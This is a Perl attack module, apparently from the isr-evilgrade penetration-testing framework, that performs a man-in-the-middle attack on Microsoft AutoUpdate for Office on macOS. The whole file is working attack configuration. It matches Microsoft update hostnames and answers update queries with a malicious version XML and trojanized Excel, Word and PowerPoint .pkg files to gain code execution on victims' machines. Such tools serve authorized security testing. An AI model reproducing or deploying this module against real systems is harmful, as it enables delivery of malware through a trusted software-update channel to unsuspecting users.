###############
# macos_office_update.pm
#
# Microsoft Office auto-update MITM attack
# Intercepts Microsoft AutoUpdate (MAU) queries
# Delivers trojanized Office updates with arbitrary code execution
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::macos_office_update;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'Microsoft Office macOS Update',
    'version'     => '1.0',
    'appver'      => 'Office 2019, Office 365, 2021 (all versions)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Intercepts Microsoft AutoUpdate (MAU) on macOS.
Related to CVE-2024-49027/49028/49029/49030 (Office RCE vulnerabilities).
Allows distribution of trojans via Word, Excel, PowerPoint auto-updates.
Affects: Microsoft Office 365, Office 2019, Office 2021 on macOS.
    },
    'vh' => '(officecdn\.microsoft\.com|macadmincenter\.microsoft\.com|officeupdates\.microsoft\.com)',
    'request' => [
        {
            'req'   => '/.*version.*xml',
            'type'  => 'file',
            'file'  => './include/macos/malicious_versions.xml',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/xml\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/download/.*Excel.*\.pkg',
            'type'  => 'file',
            'file'  => './include/macos/malicious_excel.pkg',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=Excel.pkg\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/download/.*Word.*\.pkg',
            'type'  => 'file',
            'file'  => './include/macos/malicious_word.pkg',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=Word.pkg\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/download/.*PowerPoint.*\.pkg',
            'type'  => 'file',
            'file'  => './include/macos/malicious_powerpoint.pkg',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=PowerPoint.pkg\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
